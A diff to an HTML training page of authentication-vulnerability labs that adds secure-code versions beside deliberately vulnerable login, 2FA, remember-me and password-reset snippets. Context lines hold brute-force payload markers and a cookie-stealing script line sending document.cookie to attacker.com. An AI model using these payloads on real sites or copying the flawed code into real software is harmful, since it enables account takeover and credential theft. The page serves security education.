@@ -1205,8 +1205,12 @@ def login():
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab3"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab3"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab3-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/login', methods=['POST'])
@@ -1224,6 +1228,30 @@ def login():
 <span class="vuln-line">    # Only executed for valid usernames!</span>
 <span class="vuln-line">    if not bcrypt.check_password_hash(user.password, password):</span>
         return error_response('Invalid credentials')
+
+    return success_response(user)</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab3-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    user = User.query.filter_by(username=username).first()
+
+<span class="secure-line">    # ✅ Always perform hash check to ensure consistent timing</span>
+<span class="secure-line">    if user:</span>
+<span class="secure-line">        valid = bcrypt.check_password_hash(user.password, password)</span>
+<span class="secure-line">    else:</span>
+<span class="secure-line">        # Dummy hash to prevent timing attack</span>
+<span class="secure-line">        bcrypt.check_password_hash(DUMMY_HASH, password)</span>
+<span class="secure-line">        valid = False</span>
+
+<span class="secure-line">    if not user or not valid:</span>
+<span class="secure-line">        return error_response('Invalid credentials')</span>
 
     return success_response(user)</code></pre>
                         </div>
@@ -1274,8 +1302,12 @@ username=§admin§&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab4"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab4"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab4-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/login', methods=['POST'])
@@ -1298,6 +1330,34 @@ def login():
         return error('Invalid credentials')
 
     user.failed_attempts = 0
+    return success(user)</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab4-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+<span class="secure-line">    # ✅ Check lockout BEFORE revealing if user exists</span>
+<span class="secure-line">    if is_ip_locked(request.remote_addr):</span>
+<span class="secure-line">        return error('Too many attempts. Try again later.')</span>
+
+    user = User.query.filter_by(username=username).first()
+
+<span class="secure-line">    # ✅ Generic lockout check - doesn't reveal user existence</span>
+<span class="secure-line">    if user:</span>
+<span class="secure-line">        valid = verify_password(user.password, password)</span>
+<span class="secure-line">    else:</span>
+<span class="secure-line">        verify_password(DUMMY_HASH, password)</span>
+<span class="secure-line">        valid = False</span>
+
+<span class="secure-line">    if not valid:</span>
+<span class="secure-line">        increment_failed_attempts(request.remote_addr)</span>
+<span class="secure-line">        return error('Invalid credentials')</span>
+
     return success(user)</code></pre>
                         </div>
                     </div>
@@ -1338,8 +1398,12 @@ def login():
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab5"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab5"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab5-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>rate_limiter.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">def check_rate_limit(ip_address):
@@ -1356,6 +1420,28 @@ def login(username, password, ip_address):
         return success()
     else:
         increment_failed_attempts(ip_address)
+        return failure()</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab5-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>rate_limiter.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="secure-line">def check_rate_limit(ip_address, username):</span>
+<span class="secure-line">    # ✅ Track attempts per IP AND per username</span>
+<span class="secure-line">    ip_attempts = get_failed_attempts_by_ip(ip_address)</span>
+<span class="secure-line">    user_attempts = get_failed_attempts_by_user(username)</span>
+<span class="secure-line">    if ip_attempts >= 10 or user_attempts >= 5:</span>
+<span class="secure-line">        raise RateLimitError("Too many failed attempts")</span>
+
+def login(username, password, ip_address):
+    check_rate_limit(ip_address, username)
+
+    if authenticate(username, password):
+<span class="secure-line">        # ✅ Only reset counter for THIS user, not the IP</span>
+<span class="secure-line">        reset_failed_attempts_by_user(username)</span>
+        return success()
+    else:
+<span class="secure-line">        increment_failed_attempts(ip_address, username)</span>
         return failure()</code></pre>
                         </div>
                     </div>
@@ -1399,8 +1485,12 @@ wiener:peter
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab6"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab6"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab6-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-node-js"></i><span>auth.js</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-javascript">app.post('/login', rateLimit({ max: 5 }), (req, res) => {
@@ -1414,6 +1504,25 @@ wiener:peter
 <span class="vuln-line">            return res.json({ success: true });</span>
 <span class="vuln-line">        }</span>
 <span class="vuln-line">    }</span>
+
+    res.status(401).json({ error: 'Invalid credentials' });
+});</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab6-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-node-js"></i><span>auth.js (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-javascript">app.post('/login', rateLimit({ max: 5 }), (req, res) => {
+    const { username, password } = req.body;
+
+<span class="secure-line">    // ✅ Validate password is a string, not array</span>
+<span class="secure-line">    if (typeof password !== 'string') {</span>
+<span class="secure-line">        return res.status(400).json({ error: 'Invalid input' });</span>
+<span class="secure-line">    }</span>
+
+<span class="secure-line">    if (authenticate(username, password)) {</span>
+<span class="secure-line">        return res.json({ success: true });</span>
+<span class="secure-line">    }</span>
 
     res.status(401).json({ error: 'Invalid credentials' });
 });</code></pre>
@@ -1462,8 +1571,12 @@ Content-Type: application/json
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab7"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab7"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab7-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/login', methods=['POST'])
@@ -1478,6 +1591,29 @@ def my_account():
 <span class="vuln-line">    if 'user_id' not in session:</span>
 <span class="vuln-line">        return redirect('/login')</span>
     return render_template('account.html')</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab7-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login', methods=['POST'])
+def login():
+    if authenticate(username, password):
+<span class="secure-line">        session['pending_2fa'] = user.id  # ✅ Pending, not authenticated!</span>
+        return redirect('/login2')
+
+@app.route('/my-account')
+@login_required
+def my_account():
+<span class="secure-line">    # ✅ Decorator checks BOTH user_id AND 2fa_complete</span>
+    return render_template('account.html')
+
+<span class="secure-line">def login_required(f):</span>
+<span class="secure-line">    def wrapper(*args, **kwargs):</span>
+<span class="secure-line">        if 'user_id' not in session or not session.get('2fa_complete'):</span>
+<span class="secure-line">            return redirect('/login')</span>
+<span class="secure-line">        return f(*args, **kwargs)</span>
+<span class="secure-line">    return wrapper</span></code></pre>
                         </div>
                     </div>
                 </div>
@@ -1516,8 +1652,12 @@ def my_account():
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab8"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab8"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab8-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/login2', methods=['POST'])
@@ -1531,6 +1671,28 @@ def verify_2fa():
     if user and user.mfa_code == code:
         session['user_id'] = user.id
 <span class="vuln-line">        session['2fa_complete'] = True  # ❌ Attacker gets access to victim!</span>
+        return redirect('/my-account')
+
+    return error('Invalid code')</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab8-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
+def verify_2fa():
+<span class="secure-line">    # ✅ Get username from SERVER-SIDE session only</span>
+<span class="secure-line">    if 'pending_2fa' not in session:</span>
+<span class="secure-line">        return redirect('/login')</span>
+<span class="secure-line">    user_id = session['pending_2fa']</span>
+    code = request.form.get('mfa-code')
+
+<span class="secure-line">    user = User.query.get(user_id)</span>
+
+    if user and user.mfa_code == code:
+<span class="secure-line">        del session['pending_2fa']</span>
+        session['user_id'] = user.id
+        session['2fa_complete'] = True
         return redirect('/my-account')
 
     return error('Invalid code')</code></pre>
@@ -1573,8 +1735,12 @@ mfa-code=§0000§  # Brute-force 0000-9999
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Code Review</h3>
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab9"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab9"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab9-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/login2', methods=['POST'])
@@ -1592,6 +1758,32 @@ def verify_2fa():
         return redirect('/my-account')
 
 <span class="vuln-line">    user.mfa_attempts += 1  # ❌ Resets on re-login!</span>
+    return error('Invalid code')</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab9-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/login2', methods=['POST'])
+<span class="secure-line">@rate_limit(max=10, window=300)  # ✅ Rate limit on 2FA</span>
+def verify_2fa():
+    code = request.form.get('mfa-code')
+    user = get_current_user()
+
+<span class="secure-line">    # ✅ Permanent lockout tracked in database</span>
+<span class="secure-line">    if user.mfa_lockout_until and user.mfa_lockout_until > datetime.now():</span>
+<span class="secure-line">        return error('Account locked. Contact support.')</span>
+
+<span class="secure-line">    if user.mfa_attempts >= 5:</span>
+<span class="secure-line">        user.mfa_lockout_until = datetime.now() + timedelta(hours=1)</span>
+<span class="secure-line">        return error('Too many attempts. Locked for 1 hour.')</span>
+
+    if user.mfa_code == code:
+        user.mfa_attempts = 0
+        session['2fa_complete'] = True
+        return redirect('/my-account')
+
+    user.mfa_attempts += 1
     return error('Invalid code')</code></pre>
                         </div>
                     </div>
@@ -1631,8 +1823,11 @@ def verify_2fa():
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab10"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab10"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab10-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">def create_remember_cookie(user):
@@ -1648,6 +1843,40 @@ def verify_remember_cookie(cookie):
 <span class="vuln-line">    # ❌ Compares MD5 hash - brute-forceable!</span>
 <span class="vuln-line">    if hashlib.md5(user.password.encode()).hexdigest() == password_hash:</span>
         return user
+    return None</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab10-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import secrets
+import hmac
+import hashlib
+
+def create_remember_cookie(user):
+<span class="secure-line">    # ✅ Generate cryptographically secure random token</span>
+<span class="secure-line">    token = secrets.token_urlsafe(32)</span>
+<span class="secure-line">    # ✅ Store token hash in database, not password-derived value</span>
+<span class="secure-line">    user.remember_token = hashlib.sha256(token.encode()).hexdigest()</span>
+<span class="secure-line">    user.token_expiry = datetime.utcnow() + timedelta(days=30)</span>
+    db.session.commit()
+<span class="secure-line">    return f"{user.id}:{token}"  # ✅ No password material in cookie</span>
+
+def verify_remember_cookie(cookie):
+    try:
+        user_id, token = cookie.split(':')
+        user = User.query.get(int(user_id))
+
+<span class="secure-line">        # ✅ Check token expiry</span>
+<span class="secure-line">        if user.token_expiry < datetime.utcnow():</span>
+<span class="secure-line">            return None</span>
+
+<span class="secure-line">        # ✅ Constant-time comparison prevents timing attacks</span>
+<span class="secure-line">        token_hash = hashlib.sha256(token.encode()).hexdigest()</span>
+<span class="secure-line">        if hmac.compare_digest(user.remember_token, token_hash):</span>
+            return user
+    except:
+        pass
     return None</code></pre>
                         </div>
                     </div>
@@ -1692,8 +1921,11 @@ for pwd in passwords:
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab11"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab11"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab11-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python"># Cookie stored: base64(carlos:26323c16d5f4dabff3bb136f2460a943)
@@ -1702,6 +1934,28 @@ for pwd in passwords:
 
 <span class="vuln-line">response.set_cookie('stay-logged-in', cookie,</span>
 <span class="vuln-line">                    httponly=False)  # ❌ Accessible via JavaScript!</span></code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab11-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>auth.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import secrets
+
+def create_remember_token():
+<span class="secure-line">    # ✅ Generate secure random token (not derived from password)</span>
+<span class="secure-line">    token = secrets.token_urlsafe(64)</span>
+    return token
+
+<span class="secure-line">response.set_cookie('stay-logged-in', token,</span>
+<span class="secure-line">                    httponly=True,    # ✅ Not accessible via JavaScript</span>
+<span class="secure-line">                    secure=True,      # ✅ HTTPS only</span>
+<span class="secure-line">                    samesite='Strict' # ✅ Prevent CSRF</span>
+<span class="secure-line">                    )</span>
+
+# Token stored in DB with:
+# - User ID association
+# - Expiration timestamp
+# - Bcrypt/Argon2 hash (not MD5!)</code></pre>
                         </div>
                     </div>
                 </div>
@@ -1743,8 +1997,11 @@ document.location='https://attacker.com/steal?c='+document.cookie
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab12"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab12"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab12-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/reset-password', methods=['POST'])
@@ -1759,6 +2016,35 @@ def reset_password():
 
 <span class="vuln-line">    user = User.query.filter_by(username=username).first()</span>
 <span class="vuln-line">    user.password = hash_password(new_password)  # ❌ Resets wrong user!</span>
+    db.session.commit()</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab12-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">@app.route('/reset-password', methods=['POST'])
+def reset_password():
+    token = request.form.get('token')
+    new_password = request.form.get('new-password')
+
+<span class="secure-line">    # ✅ Token is tied to specific user in database</span>
+<span class="secure-line">    reset_request = PasswordReset.query.filter_by(token_hash=hash_token(token)).first()</span>
+
+<span class="secure-line">    if not reset_request:</span>
+<span class="secure-line">        return error('Invalid or expired token')</span>
+
+<span class="secure-line">    # ✅ Check token expiry</span>
+<span class="secure-line">    if reset_request.expires_at < datetime.utcnow():</span>
+<span class="secure-line">        db.session.delete(reset_request)</span>
+<span class="secure-line">        db.session.commit()</span>
+<span class="secure-line">        return error('Token has expired')</span>
+
+<span class="secure-line">    # ✅ User is determined by the token, not user input</span>
+<span class="secure-line">    user = reset_request.user  # User from token association</span>
+    user.password = hash_password(new_password)
+
+<span class="secure-line">    # ✅ Invalidate the token after use (one-time use)</span>
+<span class="secure-line">    db.session.delete(reset_request)</span>
     db.session.commit()</code></pre>
                         </div>
                     </div>
@@ -1799,8 +2085,11 @@ new-password=hacked123
                     </ul>
                 </div>
                 <div class="code-review-section">
-                    <h3 style="margin-bottom: 15px; color: var(--text-primary);"><i class="fas fa-code" style="color: var(--accent-purple);"></i> Vulnerable Code</h3>
-                    <div class="code-container">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab13"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab13"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab13-vulnerable">
                         <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py</span></div></div>
                         <div class="code-block">
                             <pre><code class="language-python">@app.route('/forgot-password', methods=['POST'])
@@ -1816,6 +2105,35 @@ def forgot_password():
 
     send_email(user.email, f"Reset your password: {reset_url}")
     return success('Password reset email sent')</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab13-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>reset.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"># config.py
+<span class="secure-line">ALLOWED_HOSTS = ['myapp.com', 'www.myapp.com']</span>
+<span class="secure-line">BASE_URL = 'https://myapp.com'  # ✅ Hardcoded, not from request</span>
+
+@app.route('/forgot-password', methods=['POST'])
+def forgot_password():
+    username = request.form.get('username')
+    user = User.query.filter_by(username=username).first()
+
+<span class="secure-line">    # ✅ Don't reveal if user exists</span>
+<span class="secure-line">    if not user:</span>
+<span class="secure-line">        return success('If account exists, reset email sent')</span>
+
+    token = generate_reset_token(user)
+
+<span class="secure-line">    # ✅ Use hardcoded base URL from config</span>
+<span class="secure-line">    reset_url = f"{app.config['BASE_URL']}/reset?token={token}"</span>
+
+<span class="secure-line">    # ✅ Validate Host header if using it</span>
+<span class="secure-line">    if request.host not in app.config['ALLOWED_HOSTS']:</span>
+<span class="secure-line">        abort(400, 'Invalid host')</span>
+
+    send_email(user.email, f"Reset your password: {reset_url}")
+<span class="secure-line">    return success('If account exists, reset email sent')  # ✅ Generic message</span></code></pre>
                         </div>
                     </div>
                 </div>
@@ -2617,7 +2935,7 @@ for password in passwords:
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
     <script>
-        // Current state for Lab 14 multi-language support
+        // Lab 14 multi-language state
         let currentLang = 'python';
         let currentView = 'vulnerable';
 
@@ -2627,70 +2945,74 @@ for password in passwords:
                 document.querySelectorAll('.lang-tab').forEach(t => t.classList.remove('active'));
                 tab.classList.add('active');
                 currentLang = tab.dataset.lang;
-                updateLab14CodeDisplay();
+                updateLab14Code();
             });
         });
 
-        // Lab 14 code view toggle
-        function updateLab14CodeDisplay() {
-            // Only for Lab 14's multi-language code blocks
-            const containers = document.querySelectorAll('[id^="code-python"], [id^="code-php"], [id^="code-nodejs"], [id^="code-java"]');
-            containers.forEach(container => {
-                container.classList.add('hidden');
+        // Lab 14 specific code display
+        function updateLab14Code() {
+            // Only hide/show Lab 14's language-specific containers
+            ['python', 'php', 'nodejs', 'java'].forEach(lang => {
+                ['vulnerable', 'secure'].forEach(view => {
+                    const el = document.getElementById(`code-${lang}-${view}`);
+                    if (el) {
+                        if (lang === currentLang && view === currentView) {
+                            el.classList.remove('hidden');
+                        } else {
+                            el.classList.add('hidden');
+                        }
+                    }
+                });
             });
-
-            const containerId = `code-${currentLang}-${currentView}`;
-            const container = document.getElementById(containerId);
-            if (container) {
-                container.classList.remove('hidden');
-            }
         }
 
-        // Code tab handling for ALL labs (vulnerable/secure toggle)
+        // Handle code tab clicks for ALL labs
         document.querySelectorAll('.code-tab').forEach(tab => {
-            tab.addEventListener('click', function() {
-                const parent = this.closest('.code-review-section');
-                const labAttr = this.dataset.lab;
+            tab.addEventListener('click', function(e) {
+                e.preventDefault();
+                const section = this.closest('.code-review-section');
                 const view = this.dataset.view;
+                const labId = this.dataset.lab;
 
-                // Update active state for tabs in this section
-                parent.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
+                // Update active tab in this section
+                section.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
                 this.classList.add('active');
 
-                // Handle Labs 1-13 (simple toggle)
-                if (labAttr && labAttr.startsWith('lab')) {
-                    const vulnContainer = document.getElementById(`${labAttr}-vulnerable`);
-                    const secureContainer = document.getElementById(`${labAttr}-secure`);
+                if (labId && labId.startsWith('lab')) {
+                    // Labs 1-13: Simple toggle
+                    const vulnEl = document.getElementById(`${labId}-vulnerable`);
+                    const secureEl = document.getElementById(`${labId}-secure`);
 
-                    if (vulnContainer && secureContainer) {
+                    if (vulnEl && secureEl) {
                         if (view === 'vulnerable') {
-                            vulnContainer.classList.remove('hidden');
-                            secureContainer.classList.add('hidden');
+                            vulnEl.classList.remove('hidden');
+                            secureEl.classList.add('hidden');
                         } else {
-                            vulnContainer.classList.add('hidden');
-                            secureContainer.classList.remove('hidden');
+                            vulnEl.classList.add('hidden');
+                            secureEl.classList.remove('hidden');
                         }
                     }
                 } else {
-                    // Handle Lab 14 (multi-language)
+                    // Lab 14: Multi-language
                     currentView = view;
-                    updateLab14CodeDisplay();
+                    updateLab14Code();
                 }
             });
         });
 
-        // Lab item selection (sidebar navigation)
+        // Lab sidebar navigation
         document.querySelectorAll('.lab-item:not(.coming-soon)').forEach(item => {
             item.addEventListener('click', () => {
-                // Update active sidebar item
+                // Update active state
                 document.querySelectorAll('.lab-item').forEach(i => i.classList.remove('active'));
                 item.classList.add('active');
 
-                // Show corresponding lab content
+                // Show selected lab content
                 const labId = item.dataset.lab;
                 document.querySelectorAll('.lab-content').forEach(content => {
                     content.classList.add('hidden');
                 });
+
                 const labContent = document.getElementById(labId);
                 if (labContent) {
                     labContent.classList.remove('hidden');
@@ -2698,30 +3020,23 @@ for password in passwords:
             });
         });
 
-        // Copy code functionality
+        // Copy code
         function copyCode(codeId) {
-            const codeElement = document.getElementById(codeId);
-            if (codeElement) {
-                const text = codeElement.innerText;
-                navigator.clipboard.writeText(text).then(() => {
-                    const btn = event.target.closest('.code-action-btn');
-                    const originalText = btn.innerHTML;
-                    btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-                    setTimeout(() => {
-                        btn.innerHTML = originalText;
-                    }, 2000);
-                });
+            const el = document.getElementById(codeId);
+            if (el) {
+                navigator.clipboard.writeText(el.innerText);
+                alert('Copied!');
             }
         }
 
-        // Initialize - show first lab by default
+        // Initialize on page load
         document.addEventListener('DOMContentLoaded', () => {
-            // Show first non-coming-soon lab
+            // Click first available lab
             const firstLab = document.querySelector('.lab-item:not(.coming-soon)');
-            if (firstLab) {
-                firstLab.click();
-            }
-            updateLab14CodeDisplay();
+            if (firstLab) firstLab.click();
+
+            // Init Lab 14 code display
+            updateLab14Code();
         });
     </script>
 </body>
